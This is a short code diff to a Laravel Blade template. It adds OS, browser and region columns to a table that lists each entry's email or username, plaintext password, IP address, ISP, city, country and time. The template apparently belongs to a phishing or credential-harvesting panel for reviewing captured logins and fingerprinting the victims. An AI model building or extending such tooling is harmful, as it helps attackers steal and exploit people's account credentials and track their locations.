@@ -17,8 +17,11 @@
                         <th>email</th>
                         <th>password</th>
                         <th>ip</th>
+                        <th>Os</th>
+                        <th>Browser</th>
                         <th>isp</th>
                         <th>city</th>
+                        <th>region</th>
                         <th>country</th>
                         <th>time</th>
                     </tr>
@@ -29,8 +32,11 @@
                             <td>{{ $dataL->username }}</td>
                             <td>{{ $dataL->password }}</td>
                             <td>{{ $dataL->ip }}</td>
+                            <td>{{ $dataL->os }}</td>
+                            <td>{{ $dataL->browser }}</td>
                             <td>{{ $dataL->isp }}</td>
                             <td>{{ $dataL->city }}</td>
+                            <td>{{ $dataL->region }}</td>
                             <td>{{ $dataL->country }}</td>
                             <td>{{ $dataL->created_at }}</td>
                         </tr>
